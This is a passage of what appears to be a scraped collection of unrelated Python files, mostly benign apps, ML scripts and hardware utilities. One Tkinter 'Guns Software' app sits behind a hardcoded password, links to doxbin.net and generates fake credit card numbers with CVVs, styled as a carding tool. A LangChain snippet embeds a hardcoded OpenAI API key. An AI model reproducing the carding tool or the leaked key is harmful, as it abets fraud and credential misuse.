{details['seat']}\")\n            else:\n                print(\"No details found for the given booking reference.\")\n        elif choice == '6':\n            print(\"Exiting the program. Goodbye!\")\n            break\n        else:\n            print(\"Invalid choice. Please try again.\")\n\n\n# Entry point of the program.\nif __name__ == \"__main__\":\n    main()",
    "import tkinter as tk\r\nimport webbrowser\r\nfrom faker import Faker\r\n\r\ndef zaloguj():\r\n    username = entry_username.get()\r\n    password = entry_password.get()\r\n\r\n    if username == \"Guns\" and password == \"Guns123\":\r\n        label_info.config(text=\"Successfully logged in!\", fg=\"green\")\r\n        root.withdraw()\r\n        otworz_aplikacje()\r\n    else:\r\n        label_info.config(text=\"Login error. Try again!\", fg=\"red\")\r\n\r\ndef otworz_aplikacje():\r\n    app_window = tk.Toplevel()\r\n    app_window.title(\"Guns Software\")\r\n\r\n    button_open_website = tk.Button(app_window, text=\"Open Website\", command=otworz_strone, font=(\"Arial\", 12))\r\n    button_open_website.pack(padx=10, pady=5)\r\n\r\n    frame_buttons = tk.Frame(app_window)\r\n    frame_buttons.pack(padx=10, pady=5)\r\n\r\n    button_generate_visa_card = tk.Button(frame_buttons, text=\"Generate Visa Card\", command=lambda: generuj_karte_kredytowa('visa'), font=(\"Arial\", 12))\r\n    button_generate_visa_card.grid(row=0, column=0, padx=5)\r\n\r\n    button_generate_mastercard = tk.Button(frame_buttons, text=\"Generate Mastercard\", command=lambda: generuj_karte_kredytowa('mastercard'), font=(\"Arial\", 12))\r\n    button_generate_mastercard.grid(row=0, column=1, padx=5)\r\n\r\ndef otworz_strone():\r\n    webbrowser.open_new(\"https://doxbin.net/\")\r\n\r\ndef generuj_karte_kredytowa(typ_karty):\r\n    fake = Faker()\r\n    if typ_karty == 'visa':\r\n        numer_karty = fake.credit_card_number(card_type='visa16')\r\n    elif typ_karty == 'mastercard':\r\n        numer_karty = fake.credit_card_number(card_type='mastercard')\r\n    \r\n    data_waznosci = fake.credit_card_expire(start=\"now\", end=\"+10y\", date_format=\"%m/%y\")\r\n    ccv = fake.credit_card_security_code(card_type=typ_karty)\r\n    \r\n    label_credit_card.config(text=f\"Generated {typ_karty.capitalize()} Credit Card: {numer_karty}\\nExpiration Date: {data_waznosci}\\nCCV: {ccv}\", font=(\"Arial\", 12), fg=\"blue\")\r\n    \r\n    zapisz_do_pliku(numer_karty, data_waznosci, ccv)\r\n\r\ndef zapisz_do_pliku(numer_karty, data_waznosci, ccv):\r\n    with open(\"GunsSoftware_credit_cards.txt\", \"a\") as file:\r\n        file.write(f\"Card Number: {numer_karty}, Expiration Date: {data_waznosci}, CCV: {ccv}\\n\")\r\n\r\nroot = tk.Tk()\r\nroot.title(\"Guns Software\")\r\n\r\nlabel_username = tk.Label(root, text=\"Username:\", font=(\"Arial\", 12))\r\nlabel_username.grid(row=0, column=0, padx=10, pady=5)\r\n\r\nentry_username = tk.Entry(root, font=(\"Arial\", 12))\r\nentry_username.grid(row=0, column=1, padx=10, pady=5)\r\n\r\nlabel_password = tk.Label(root, text=\"Password:\", font=(\"Arial\", 12))\r\nlabel_password.grid(row=1, column=0, padx=10, pady=5)\r\n\r\nentry_password = tk.Entry(root, show=\"*\", font=(\"Arial\", 12))\r\nentry_password.grid(row=1, column=1, padx=10, pady=5)\r\n\r\nbutton_login = tk.Button(root, text=\"Login\", command=zaloguj, font=(\"Arial\", 12))\r\nbutton_login.grid(row=2, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nlabel_info = tk.Label(root, text=\"\", font=(\"Arial\", 12))\r\nlabel_info.grid(row=3, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nlabel_credit_card = tk.Label(root, text=\"\", font=(\"Arial\", 12))\r\nlabel_credit_card.grid(row=4, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nroot.mainloop()\r\n",
    "from dis import Instruction\nfrom operator import invert\nimport sys\nimport threading\nfrom tracemalloc import start\n\nsys.settrace\n\nlettersDirValues = {\n    \"R\": 1,\n    \"L\": -1,\n    \"U\": -1,\n    \"D\": 1\n}\nlettersDirs = {\n    \"U\": [-1, 0],\n    \"R\": [0, 1],\n    \"D\": [1, 0],\n    \"L\": [0, -1]\n}\nnumToLetter = {\n    \"0\": \"R\",\n    \"1\": \"D\",\n    \"2\": \"L\",\n    \"3\": \"U\"\n}\n\ndef solvepart1():\n    #read in data\n    data = fileRead(\"input.txt\")\n    instructions = []\n    for row in data:\n        splitRow = row.split(\" \")\n        instructions.append((splitRow[0],int(splitRow[1])))\n\n    #generate grid\n    global grid\n    grid, sum, startingPos = generateGrid(instructions)\n\n    print(len(grid),len(grid[0]))\n    for row in grid:\n        print(\"\".join(row))\n\n    #fill grid to calculate area of pit\n    global checkedSpaces\n    checkedSpaces = []\n    for i in range(startingPos[0]-1, startingPos[0]+2):\n        for j in range(startingPos[1]-1, startingPos[1]+2):\n            if inGrid((i,j), grid) and grid[i][j] != \"#\" and ((i,j) not in checkedSpaces):\n                enclosed, totalSpaces = flood((i,j))\n                if enclosed:\n                    sum = sum + totalSpaces\n    print(sum)\n\n#generates a grid with a map of the outline of the hole using the instructions\n#returns the grid, the area of the trenches, and the starting position\ndef generateGrid(instructions):\n    greatestWidth = 0\n    greatestHeight = 0\n    leastWidth = 0\n    leastHeight = 0\n    width = 0\n    height = 0\n    for instruction in instructions:\n        if instruction[0] in (\"L\",\"R\"):\n            width = width + ( instruction[1] * lettersDirValues[instruction[0]] )\n            if width > greatestWidth: greatestWidth = width\n            if width < leastWidth: leastWidth = width\n        else:\n            height = height + ( instruction[1] * lettersDirValues[instruction[0]] )\n            if height > greatestHeight: greatestHeight = height\n            if height < leastHeight: leastHeight = height\n    totalWidth = greatestWidth - leastWidth + 1\n    totalHeight = greatestHeight - leastHeight + 1\n    startingPos = (leastHeight * -1, leastWidth * -1 )\n\n    grid = [ [\".\"] * totalWidth for _ in range(totalHeight) ]\n    currentPos = startingPos\n    area = 0\n    grid[currentPos[0]][currentPos[1]] = \"#\"\n    for instruction in instructions:\n        dirCoords = lettersDirs[instruction[0]]\n        for _ in range(1,instruction[1]+1):\n            area += 1\n            currentPos = posAdd(currentPos,dirCoords)\n            grid[currentPos[0]][currentPos[1]] = \"#\"\n\n    return grid, area, startingPos\n\n#check if a location is fully within the trench by recursively checking all adjacent spaces, returns whether space is in pipe and how much space it covered\ndef flood(target):\n    if ( not inGrid(target, grid) ):\n        return False, 0 #location is off of grid (area is not enclosed)\n    elif (grid[target[0]][target[1]] == \"#\") or (target in checkedSpaces):\n        return True, 0 #location is invalid (trench or already checked)\n    else:\n        checkedSpaces.append(target)\n        sumSpaces = 0;\n        enclosed = True\n\n        for dirCoord in lettersDirs.values():\n            newTarget = posAdd(target, dirCoord)\n            newEnclosed, numSpaces = flood(newTarget)\n            sumSpaces = sumSpaces + numSpaces\n            enclosed = enclosed and newEnclosed\n\n        return enclosed, sumSpaces + 1 #location is open\n\ndef solvepart2():\n    #read in data\n    data = fileRead(\"input.txt\")\n    instructions = []\n    for row in data:\n        splitRow = row.split(\" \")\n        dist = int(splitRow[2][2:7],16)\n        direc = numToLetter[splitRow[2][7]]\n        instructions.append((direc, dist))\n\n    #find the max and min height of the pit, plus the left-most and right-most x-y and their positions in the instructions \n    leftmostPos = (0,0)\n    leftInstrIndex = -1\n    rightmostPos = (0,0)\n    rightInstrindex = -1\n    maxHeight = 0\n    minHeight = 0\n    width = 0\n    height = 0\n    for i in range(len(instructions)):\n        instruction = instructions[i]\n        if instruction[0] in (\"L\",\"R\"):\n            width = width + ( instruction[1] * lettersDirValues[instruction[0]] )\n            if width <= leftmostPos[1]:\n                leftmostPos = (height, width)\n                leftInstrIndex = i+1\n            if width >= rightmostPos[1]:\n                rightmostPos = (height, width)\n                rightInstrindex = i+1\n        else:\n            height = height + ( instruction[1] * lettersDirValues[instruction[0]] )\n            if height > maxHeight: maxHeight = height\n            if height < minHeight: minHeight = height\n\n    #find the amount of space not in the pit by adding and subtracting rectangles whenever you move sideways\n    invertedSum = 0\n    currentPos = leftmostPos\n    currentInstrIndex = leftInstrIndex\n    percentDone = 0\n    prevDown = False\n    downAmount = 0\n    while True:\n        instruction = instructions[currentInstrIndex]\n        if instruction[0] in (\"L\",\"R\"):\n            if perce",
    "from tkinter import *\nfrom quiz_brain import QuizBrain\n\n\nTHEME_COLOR = \"#375362\"\n\n\nclass QuizInterface:\n\n    def __init__(self, quiz_brain: QuizBrain):\n        self.quiz = quiz_brain\n        self.window = Tk()\n        self.window.title(\"Quizler\")\n        self.window.config(padx=20, pady=20, bg=THEME_COLOR)\n\n        self.score_label = Label(text=\"Score: 0\", fg=\"white\", bg=THEME_COLOR)\n        self.score_label.grid(row=0, column=1)\n\n        self.canvas = Canvas(width=300, height=250, bg=\"white\")\n        self.question_text = self.canvas.create_text(\n            150,\n            125,\n            width=280,\n            text=\"Some question text here\",\n            fill=THEME_COLOR,\n            font=(\"Arial\", 20, \"italic\"))\n        self.canvas.grid(row=1, column=0, columnspan=2, pady=50)\n\n        true_image = PhotoImage(file=\"images/true.png\")\n        self.true_button = Button(image=true_image, highlightthickness=0, command=self.true_pressed)\n        self.true_button.grid(row=2, column=0)\n\n        false_image = PhotoImage(file=\"images/false.png\")\n        self.false_button = Button()\n        self.false_button = Button(image=false_image, highlightthickness=0, command=self.false_pressed)\n        self.false_button.grid(row=2, column=1)\n\n        self.get_next_question()\n\n        self.window.mainloop()\n\n    def get_next_question(self):\n        self.canvas.config(bg=\"white\")\n\n        if self.quiz.still_has_questions():\n            self.score_label.config(text=f\"Score: {self.quiz.score}\")\n            q_text = self.quiz.next_question()\n            self.canvas.itemconfig(self.question_text, text=q_text)\n        else:\n            self.canvas.itemconfig(self.question_text, text=\"You've reached the end of the quiz!\")\n            self.true_button.config(state=\"disabled\")\n            self.false_button.config(state=\"disabled\")\n\n    def true_pressed(self):\n        self.give_feedback(self.quiz.check_answer(\"True\"))\n\n    def false_pressed(self):\n        self.give_feedback(self.quiz.check_answer(\"False\"))\n\n    def give_feedback(self, is_right):\n        if is_right:\n            self.canvas.config(bg=\"green\")\n        else:\n            self.canvas.config(bg=\"red\")\n        self.window.after(1000, self.get_next_question)\n",
    "from argparse import ArgumentParser\nimport os\nimport json\nfrom transformers import T5Tokenizer, T5ForConditionalGeneration\nimport numpy as np\nfrom sklearn.metrics import f1_score\nfrom googletrans import Translator\nimport random\nfrom constants import SLOT_LISTS\nfrom build_template import make_template, make_template_long_context, make_template_slot, make_template_slot_xtremeup, make_template_joint\n\nparser = ArgumentParser(description='Arguments for training')\nparser.add_argument('--dataset', type=str, help='Dataset name', default=\"multi3nlu\")\nparser.add_argument('--domain', type=str, help='Domain', default=\"banking\")\nparser.add_argument('--in_language', action='store_true', help='Whether the templates are in the target language')\nparser.add_argument('--setting', type=int, help='Training data setting; [Options: 20, 10, 1]', default=10)\nparser.add_argument('--fold', type=int, help='Fold', default=0)\nparser.add_argument('--train', action='store_true', help='Whether it is training data')\nparser.add_argument('--language', type=str, help='Language', default=\"english\")\nparser.add_argument('--template_name', type=str, help='Template key', default=\"none_none_none\")\nparser.add_argument('--task', type=str, help='Task working on; Options: [intents, slots]', default=\"intents\")\nparser.add_argument('--data_filter', type=str, help='How to filter the data: by folds/random', default=\"folds\")\nparser.add_argument('--num_examples', type=int, help='Number of random examples', default=500)\n\nargs = parser.parse_args()\n\ndata_dir = os.path.join(args.dataset, args.language, args.domain)\n\nwith open(\"templates.json\") as json_file:\n    templates_dict = json.load(json_file)\nif args.task in [\"intents\", \"slots\"]:\n  templates_dict = templates_dict[args.task]\n\nif args.in_language:\n  templates_dict = {intent: template for intent, template in templates_dict.items() if args.language in intent}\n\ndef get_data_by_fold(args):\n  if args.dataset==\"multi3nlu\":\n    total_folds = 20\n  else:\n    total_folds = 10\n\n  if args.setting==10:\n    fold = args.fold*2\n    if args.train:\n      folds = [fold, fold+1]\n    else:\n      folds = [i for i in range(total_folds) if not i in [fold, fold+1]]\n  elif args.setting==20:\n    fold = args.fold\n    if args.train:\n      folds = [fold]\n    else:\n      folds = [i for i in range(total_folds) if not i in [fold]]\n  elif args.setting==1:\n    fold = args.fold*2\n    if args.train:\n      folds = [i for i in range(total_folds) if not i in [fold, fold+1]]\n    else:\n      folds = [fold, fold+1]\n\n  print(folds)\n  data = []\n  for fold_i in folds:\n    with open(os.path.join(data_dir, f\"fold{fold_i}.json\")) as json_file:\n      data += json.load(json_file)\n  return data\n\ndef get_data_random(args):\n  if args.dataset==\"multi3nlu\":\n    total_folds = 20\n  else:\n    total_folds = 10\n  data = []\n  for fold_i in range(total_folds):\n    with open(os.path.join(data_dir, f\"fold{fold_i}.json\")) as json_file:\n      data += json.load(json_file)\n\n  with open(os.path.join(data_dir, f\"test_samples.txt\"), \"r\") as tst_idx_file:\n    test_indices = tst_idx_file.readlines()\n  test_indices = [int(idx) for idx in test_indices]\n  if not args.train:\n    data_filtered = [data[idx] for idx in test_indices]\n  else:\n    indices_filtered = [idx for idx in range(len(data)) if idx not in test_indices]\n    random.seed(args.fold)\n    indices_filtered = random.sample(indices_filtered, args.num_examples)\n    data_filtered = [data[idx] for idx in indices_filtered]\n\n  return data_filtered\n\n\nslot_desc_dict = None\n\nif args.in_language:\n  template = templates_dict[args.template_name+\"_\"+args.language]\nelse:\n  if args.task in [\"intents\", \"slots\"]:\n    template = templates_dict[args.template_name]\n  else:\n    template = {\"intents\":templates_dict[\"intents\"][args.template_name], \"slots\":templates_dict[\"slots\"][args.template_name]}\nwith open(os.path.join(args.dataset, \"english\", \"ontology.json\")) as json_file:\n  ontology = json.load(json_file)\nif args.task==\"intents\":\n  intent_desc_dict = {key:ontology[\"intents\"][key][\"description\"][14:-1] for key in ontology[\"intents\"].keys() if \"general\" in ontology[\"intents\"][key][\"domain\"] or args.domain in ontology[\"intents\"][key][\"domain\"]}\n  for intent, description in intent_desc_dict.items():\n    if not description.startswith(\"to \"):\n      intent_desc_dict[intent] = description.replace(\"asking\", \"to ask\")\n  if args.template_name==\"context_question\":\n      intent_desc_dict = {intent: \"is the intent \"+desc for intent, desc in intent_desc_dict.items()}\n  if args.in_language:\n    translator = Translator()\n    intent_desc_dict = {intent:translator.translate(description, dest=args.language).text for intent, description in intent_desc_dict.items()}\n    print(intent_desc_dict)\nelif args.task==\"slots\":\n  intent_desc_dict = {key:ontology[\"slots\"][key][\"description\"] for key in ontology[\"slots\"].keys() if \"general\" in ontology[\"slots\"][key][\"domain\"] or args.domain in ontology[\"slots\"][key][\"domain\"]}\nelif args.task==\"joint\":\n  slot_desc_dict = {key:",
    "from flet import *\nclass CustomCheckBox(UserControl):\n  def __init__(self,color,label='',selection_fill='#183588',size=25,stroke_width=2,animation=None, checked=False, font_size=17, pressed=None):\n    super().__init__()\n    self.selection_fill = selection_fill\n    self.color = color\n    self.label = label\n    self.size = size\n    self.stroke_width = stroke_width\n    self.animation=animation\n    self.checked=checked\n    self.font_size=font_size\n    self.pressed  = pressed\n  def _checked(self):\n      self.check_box = Container(\n        animate=self.animation,\n        width=self.size,height=self.size,\n        border_radius=(self.size/2)+5,\n        bgcolor=self.CHECKED,\n        content=Icon(icons.CHECK_ROUNDED,size=15,),)\n      return self.check_box\n  \n  def _unchecked(self):\n    self.check_box = Container(\n      animate=self.animation,\n      width=self.size,height=self.size,\n      border_radius=(self.size/2)+5,\n      bgcolor=None,\n      border = border.all(color=self.color,width=self.stroke_width),\n      content=Container(),\n      ) \n    return self.check_box\n\n  def build(self):\n    self.BG = '#696969'\n    self.FG = '#1C1C1C'\n    self.PINK = '#FF8C00'\n    self.CHECKED = '#FF8C00'\n\n    if self.checked == True:  \n      return Column(controls=[\n        Container(\n          on_click = lambda e: self.checked_check(e),\n          content=Row(\n            controls=[\n          self._checked(),\n          Text(self.label,\n                font_family='poppins',\n                size=self.font_size,\n                weight=FontWeight.W_300,),\n        ]))\n      ])\n      \n    else:  \n      return Column(\n        controls=[\n        Container(on_click = lambda e: self.checked_check(e),\n          content=Row(\n            controls=[\n          self._unchecked(),\n          Text(self.label,\n                font_family='poppins',\n                size=self.font_size,\n                weight=FontWeight.W_300,),\n        ]))\n      ])\n\n  def checked_check(self,e):\n    print(self.checked)\n    if self.checked == False:\n        self.checked = True\n        self.check_box.border = None\n        self.check_box.bgcolor = self.CHECKED\n        self.check_box.content = Icon(icons.CHECK_ROUNDED,size=15,)\n        self.update()\n\n        \n    elif self.checked == True:\n        self.checked = False\n        self.check_box.bgcolor = None\n        self.check_box.border = border.all(color=self.color,width=self.stroke_width)\n        self.check_box.content.visible = False\n        self.update()\n        \n\n    if self.pressed:\n      self.run()       \n  def is_checked(self):\n      return self.checked\n\n  def run(self,*args):\n    self.pressed(args)",
    "!pip install langchain\n!pip install openai==0.28\n!pip install chromadb==0.3.29\n!pip install tiktoken\n!pip install pypdf\n\nfrom langchain.chat_models import ChatOpenAI\nfrom langchain.llms import OpenAI\nfrom langchain.chains import VectorDBQA, RetrievalQA\nfrom langchain.document_loaders import TextLoader, PyPDFLoader, DirectoryLoader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.embeddings import OpenAIEmbeddings\nfrom langchain.vectorstores import Chroma\nimport openai\n\ndoc_loader = DirectoryLoader('Python',glob=\"./*.pdf\",loader_cls=PyPDFLoader)\nhrdocument = doc_loader.load()\nhrdocument\n\ntext_splitter = RecursiveCharacterTextSplitter(chunk_size = 1000, chunk_overlap = 0)\ntexts = text_splitter.split_documents(hrdocument)\n\napi_key = \"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\"\nopenai_embeddings = OpenAIEmbeddings(openai_api_key = api_key)\nembedding = openai_embeddings\nvectordb = Chroma.from_documents(documents = texts,\n                                 embedding=embedding,\n                                 persist_directory=\"Py_Basics\")\n\nfrom io import open_code\ngptllm = ChatOpenAI(model_name = 'gpt-3.5-turbo', openai_api_key = api_key, temperature = 0)\n\nqa = RetrievalQA.from_chain_type(llm = gptllm,\n                                 chain_type = \"stuff\",\n                                 retriever = vectordb.as_retriever())\n\nwhile True:\n  prompt = input(\"\\nAsk Anything: \")\n  if prompt == 'Exit':\n    break\n  if prompt.strip()==\"\":\n    continue\n  res = qa(prompt)\n  print(\"\\n\\n Question:\")\n  print(prompt)\n  print(f\"\\n> Response:\")\n  print(res['result'])\n",
    "import requests\n\n# Prompting the user to enter the auth token\nauth_token = input(\"Please enter your auth token: \")\n\nheaders = {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\",\n    \"Accept-Encoding\": \"gzip, deflate, br, zstd\",\n    \"Accept-Language\": \"en-US,en;q=0.9\",\n    \"Cache-Control\": \"max-age=0\",\n    \"Sec-Ch-Ua\": \"\\\"Microsoft Edge\\\";v=\\\"123\\\", \\\"Not:A-Brand\\\";v=\\\"8\\\", \\\"Chromium\\\";v=\\\"123\\\"\",\n    \"Sec-Ch-Ua-Mobile\": \"?0\",\n    \"Sec-Ch-Ua-Platform\": \"\\\"Windows\\\"\",\n    \"Sec-Fetch-Dest\": \"document\",\n    \"Sec-Fetch-Mode\": \"navigate\",\n    \"Sec-Fetch-Site\": \"none\",\n    \"Sec-Fetch-User\": \"?1\",\n    \"Upgrade-Insecure-Requests\": \"1\",\n    \"User-Agent\": \"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36\",\n    \"X-Auth-Token\": auth_token\n}\n\nurl = \"https://api.bloxflip.com/user\"\nresponse = requests.get(url, headers=headers)\n\nif response.status_code == 200:\n    data = response.json()\n    if data.get(\"success\", False):\n        roblox_id = data.get(\"robloxId\")\n        roblox_username = data.get(\"robloxUsername\")\n        if roblox_id is not None and roblox_username is not None:\n            print(f\"Your Roblox ID is: {roblox_id}\")\n            print(f\"Your Roblox username is: {roblox_username}\")\n        else:\n            print(\"Roblox ID or Roblox username not found in response.\")\n    else:\n        print(\"Request was not successful.\")\nelse:\n    print(\"Failed to retrieve data. Status code:\", response.status_code)\n",
    "#\n# Licensed under 3-Clause BSD license available in the License file. Copyright (c) 2021-2022 iRobot Corporation. All rights reserved.\n#\n\nfrom irobot_edu_sdk.backend.bluetooth import Bluetooth\nfrom irobot_edu_sdk.robots import event, hand_over, Color, Robot, Root, Create3\nfrom irobot_edu_sdk.music import Note\nimport random\nimport asyncio\nimport re\nimport time\n\n\nrobot = Create3(Bluetooth()) \n\n \nready = True\ntimer = True\nrunning = True\nbattery_levels = []\n\ngx_min = -80.0\ngx_max = 80.0\ngy_min = -80.0\ngy_max = 80.0\n\n\noob_x = False\noob_y = False\n\ncount = 0\n\nasync def run(robot):\n    IB = True\n    oob_x = False\n    oob_y = False\n    restart = 0\n    global count\n    \n    await robot.reset_navigation()\n    randomStartAngle = random.randint(-180,180)\n    await robot.turn_left(randomStartAngle)\n    while True:\n        restart = 0\n        while IB == True:\n            restart += 1\n            await robot.move(3)\n            battery = await robot.get_battery_level()\n            x,y = get_x_y(robot)\n            count += 1\n            oob_x,oob_y = out_of_bounds(x, y ,oob_x,oob_y)\n           \n            if ((oob_x == True or oob_y == True) and restart > 4):\n                IB = False \n                  \n            print(x,y)\n\n        await robot.turn_left(180)\n        await robot.move(7)\n        randomAngle = random.randint(-75,75)\n        await robot.turn_left(randomAngle)\n        oob_x = False\n        oob_y = False\n        IB = True\n    \n    print(\"completed with a count of:\", count)\n        \n        \n\ndef get_x_y(robot):\n    pose = str(robot.pose)\n    pose_list = re.split(r'[(),\\s\u00b0]+', pose)\n    temp_x = pose_list[1]\n    temp_y = pose_list[2]\n    x = float(temp_x)\n    y = float(temp_y)\n    return x,y\n\n\ndef out_of_bounds(x,y,oob_x,oob_y):\n    if not(gx_min <= x <= gx_max):\n        oob_x = True\n       \n    if not (gy_min <= y <= gy_max):\n        oob_y = True    \n\n    return oob_x,oob_y\n\n\nasync def main(robot):\n    global running\n    try:\n        await asyncio.wait_for(run(robot), timeout=600)\n    except asyncio.TimeoutError:\n        running = False\n\n    print(\"program complete\")\n\nloop = asyncio.get_event_loop()\nloop.run_until_complete(main(robot))\n\n\n@event(robot.when_play)\nasync def play(robot):\n    global running\n    global battery_levels\n    global count\n    control = 0\n    take = 100000\n    while running:\n        if(control ==take):\n            battery = await robot.get_battery_level()\n            battery_levels.append(battery[1])\n            control = 0\n        else:control +=1\n        #print(control)\n    \n    print(battery_levels)\n    print(count)\n   \n\nrobot.play()\n",
    "#!/usr/bin/env python3\n\nimport usb.core\nimport usb.util\n\nimport array\nimport struct\nimport sys\nimport binascii\nimport time\nimport hexdump\nimport argparse\nfrom construct import *\n\nclass HID_REQ:\n    DEV_TO_HOST = usb.util.build_request_type(\n        usb.util.CTRL_IN, usb.util.CTRL_TYPE_CLASS, usb.util.CTRL_RECIPIENT_INTERFACE)\n    HOST_TO_DEV = usb.util.build_request_type(\n        usb.util.CTRL_OUT, usb.util.CTRL_TYPE_CLASS, usb.util.CTRL_RECIPIENT_INTERFACE)\n    GET_REPORT = 0x01\n    SET_REPORT = 0x09\n\nVALID_DEVICE_IDS = [\n    (0x054c, 0x0ce6),\n]\n\nclass DS:\n\n    def __init__(self):\n        self.wait_for_device()\n\n        if sys.platform != 'win32' and self.__dev.is_kernel_driver_active(0):\n            try:\n                self.__dev.detach_kernel_driver(0)\n            except usb.core.USBError as e:\n                sys.exit('Could not detatch kernel driver: %s' % str(e))\n\n    def wait_for_device(self):\n        print(\"Waiting for a DualSense...\")\n        while True:\n            for i in VALID_DEVICE_IDS:\n                self.__dev = usb.core.find(idVendor=i[0], idProduct=i[1])\n                if self.__dev is not None:\n                    print(\"Found a DualSense: vendorId=%04x productId=%04x\" % (i[0], i[1]))\n                    return\n            time.sleep(1)\n    \n    def hid_get_report(self, report_id, size):\n        dev = self.__dev\n        #ctrl_transfer(bmRequestType, bRequest, wValue=0, wIndex=0, data_or_wLength=None, timeout=None)\n        assert isinstance(size, int), 'get_report size must be integer'\n        assert report_id <= 0xff, 'only support report_type == 0'\n        return dev.ctrl_transfer(HID_REQ.DEV_TO_HOST, HID_REQ.GET_REPORT, report_id, 0, size + 1)[1:].tobytes()\n    \n    \n    def hid_set_report(self, report_id, buf):\n        dev = self.__dev\n        assert isinstance(buf, (bytes, array.array)), 'set_report buf must be buffer'\n        assert report_id <= 0xff, 'only support report_type == 0'\n        buf = struct.pack('B', report_id) + buf\n        return dev.ctrl_transfer(HID_REQ.HOST_TO_DEV, HID_REQ.SET_REPORT, (3 << 8) | report_id, 0, buf)\n    \nclass Handlers:\n    def __init__(self, dev):\n        self.__dev = dev\n\n    def info(self, args):\n        info = self.__dev.hid_get_report(0x20, 0x10)\n        print(info)\n\nds = DS()\nhandlers = Handlers(ds)\n\nparser = argparse.ArgumentParser(description=\"Play with the DS controller\",\n                                 epilog=\"By the_al, modified by zeco, help for test by morteza\")\n\nsubparsers = parser.add_subparsers(dest=\"action\")\n\n# Info\np = subparsers.add_parser('info', help=\"Print info about the DS\")\np.set_defaults(func=handlers.info)\n\nargs = parser.parse_args()\nif not hasattr(args, \"func\"):\n    parser.print_help()\n    exit(1)\nargs.func(args)\n",
    "import torch\nfrom torchvision import models, transforms\nfrom torch import nn\nimport requests\nfrom PIL import Image\nfrom io import BytesIO\nimport os\nimport argparse\n\n# T\u1ea1o m\u1ed9t parser\nparser = argparse.ArgumentParser(description='Image Classification')\nparser.add_argument('--image_url', type=str, help='URL of the image to classify')\nargs = parser.parse_args()\nimage_url = args.image_url\n\n# \u0110\u1ecbnh ngh\u0129a c\u00e1c ph\u00e9p bi\u1ebfn \u0111\u1ed5i ti\u1ec1n x\u1eed l\u00fd\ntransform = transforms.Compose([\n    transforms.Resize((512, 512)),\n    transforms.ToTensor(),\n    transforms.Normalize(mean=[0.6689, 0.6875, 0.7218], std=[0.3951, 0.3775, 0.3541]),  # Normalize with current dataset\n])\n\n# T\u1ea3i m\u00f4 h\u00ecnh \u0111\u00e3 \u0111\u01b0\u1ee3c hu\u1ea5n luy\u1ec7n\nmodel_path = 'best_model.pt'\nmodel = models.resnet50(weights=None)\nnum_ftrs = model.fc.in_features\nmodel.fc = nn.Linear(num_ftrs, 3)  # C\u1eadp nh\u1eadt s\u1ed1 l\u1edbp d\u1ef1a v\u00e0o b\u1ed9 d\u1eef li\u1ec7u c\u1ee7a b\u1ea1n\ndevice = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\")\nmodel = model.to(device)\nmodel.load_state_dict(torch.load(model_path, map_location=device))\nmodel.eval()\n\n# H\u00e0m load v\u00e0 bi\u1ebfn \u0111\u1ed5i h\u00ecnh \u1ea3nh t\u1eeb URL ho\u1eb7c \u0111\u01b0\u1eddng d\u1eabn t\u1ec7p\ndef load_and_transform_image(image_path, transform):\n    if os.path.isfile(image_path):\n        image = Image.open(image_path).convert('RGB')\n    else:\n        response = requests.get(image_path)\n        image = Image.open(BytesIO(response.content)).convert('RGB')\n    return transform(image)\n\n# H\u00e0m suy lu\u1eadn \u0111\u1ec3 d\u1ef1 \u0111o\u00e1n l\u1edbp c\u1ee7a h\u00ecnh \u1ea3nh\ndef predict_image(image_url, model, transform):\n    image = load_and_transform_image(image_url, transform)\n    image = image.to(device)\n    image = image.unsqueeze(0)  # Th\u00eam m\u1ed9t chi\u1ec1u batch_size\n    with torch.no_grad():\n        outputs = model(image)\n        _, predicted = torch.max(outputs, 1)\n    classes = ['checked', 'other', 'unchecked']\n    predicted_class = classes[predicted[0]]\n    return predicted_class\n\n# Predict\npredicted_class = predict_image(image_url, model, transform)\nprint(f'Predicted class: {predicted_class}')\n",
    "import os\nimport secrets\nfrom fastapi import FastAPI, Request\nfrom starlette.config import Config\nfrom starlette.middleware.sessions import SessionMiddleware\nfrom starlette.responses import RedirectResponse\nfrom authlib.integrations.starlette_client import OAuth\nfrom authlib.integrations.starlette_client import OAuthError\nfrom fastapi.responses import JSONResponse\nfrom starlette.responses import HTMLResponse\n\n\n# Create the FastAPI app\napp = FastAPI()\n\n# Load environment variables\nGOOGLE_CLIENT_ID = os.environ.get('GOOGLE_CLIENT_ID') or None\nGOOGLE_CLIENT_SECRET = os.environ.get('GOOGLE_CLIENT_SECRET') or None\nSECRET_KEY = os.environ.get('SECRET_KEY') or None\nREDIRECT_URL = os.environ.get('REDIRECT_URL') or None\n\n\nif None in (GOOGLE_CLIENT_ID, GOOGLE_CLIENT_SECRET, SECRET_KEY, REDIRECT_URL):\n    raise BaseException('Missing env variables')\n\n# Configure OAuth\nconfig_data = {'GOOGLE_CLIENT_ID': GOOGLE_CLIENT_ID, 'GOOGLE_CLIENT_SECRET': GOOGLE_CLIENT_SECRET}\nstarlette_config = Config(environ=config_data)\noauth = OAuth(starlette_config)\noauth.register(\n    name='google',\n    server_metadata_url='https://accounts.google.com/.well-known/openid-configuration',\n    client_kwargs={'scope': 'openid email profile','redirect_url': REDIRECT_URL},\n)\n\n# Add session middleware\napp.add_middleware(SessionMiddleware, secret_key=SECRET_KEY)\n\n\n\n# Login route\n@app.route('/login')\nasync def login(request: Request):\n    redirect_uri = request.url_for('auth')  # This creates the url for our /auth endpoint\n    return await oauth.google.authorize_redirect(request, redirect_uri)\n\n# Auth route\n@app.route('/auth')\nasync def auth(request: Request):\n    \n    try:\n        token = await oauth.google.authorize_access_token(request)\n        # user_data = await oauth.google.parse_id_token(request, token)\n        # Clear the stored state after successful authorization  \n    except OAuthError as e:\n        # Handle OAuth errors\n        print(\"OAuthError:\", e)\n        return RedirectResponse(url='/login')  # Redirect to login page or handle error as needed\n    user = token.get('userinfo')\n    if user:\n        request.session['user'] = dict(user)\n    return RedirectResponse(url='/')\n\n# Public route\n@app.get('/')\ndef public(request: Request):\n    user = request.session.get('user')\n    if user:\n        name = user.get('name')\n        return HTMLResponse(f'<p>Hello 